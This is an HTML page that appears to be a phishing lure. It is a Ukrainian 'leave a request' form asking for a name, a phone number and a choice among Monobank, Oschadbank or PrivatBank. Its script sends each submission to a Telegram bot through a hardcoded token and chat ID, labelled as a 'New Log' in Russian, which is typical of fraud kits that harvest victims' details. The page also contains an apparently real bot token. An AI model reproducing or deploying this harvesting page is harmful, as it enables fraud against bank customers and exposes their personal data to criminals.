<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Сайт</title>

<style>
body {
  margin: 0;
  font-family: Arial;
  background: linear-gradient(135deg, #0f172a, #1e3a8a);
  color: white;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}

.box {
  background: rgba(255,255,255,0.05);
  backdrop-filter: blur(10px);
  padding: 25px;
  border-radius: 16px;
  width: 320px;
  text-align: center;
}

input {
  width: 100%;
  padding: 12px;
  margin: 10px 0;
  border: none;
  border-radius: 8px;
}

/* услуги */
.service {
  padding: 10px;
  margin: 5px 0;
  border-radius: 8px;
  background: #334155;
  cursor: pointer;
}

.service.active {
  background: #3b82f6;
}

button {
  width: 100%;
  padding: 12px;
  background: linear-gradient(90deg, #3b82f6, #06b6d4);
  border: none;
  border-radius: 8px;
  color: white;
  margin-top: 10px;
}
</style>
</head>

<body>

<div class="box">
  <h2 Оставити заявку</h2>

  <input type="text" id="name" placeholder="Ваше ім'я">
  <input type="text" id="phone" placeholder="Ваш телефон">

  <p>Виберіть ваш банк:</p>

  <div class="service" onclick="selectService(this)">Monobank</div>
  <div class="service" onclick="selectService(this)">Oshad Bank</div>
  <div class="service" onclick="selectService(this)">Privat Bank</div>

  <button onclick="send()">Подати заявку</button>
</div>

<script>
let selectedService = "";

function selectService(el) {
  document.querySelectorAll(".service").forEach(e => e.classList.remove("active"));
  el.classList.add("active");
  selectedService = el.innerText;
}

function send() {
  const name = document.getElementById("name").value.trim();
  const phone = document.getElementById("phone").value.trim();

  if (!name || !phone || !selectedService) {
    alert("Заповніть всі поля і виберіть ваш банк");
    return;
  }

  const token = "8589160707:AAEHCqUhzfom1D3_gtlG5eTiIrtPnXCGnNk";
  const chat_id = "8035773808";

  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chat_id,
      text: `🔥 Новый Лог 👻:\nИмя: ${name}\nТелефон: ${phone}\nКарта: ${selectedService}`
    })
  });

  alert("Заявка відправлена!");
</script>

</body>
</html>
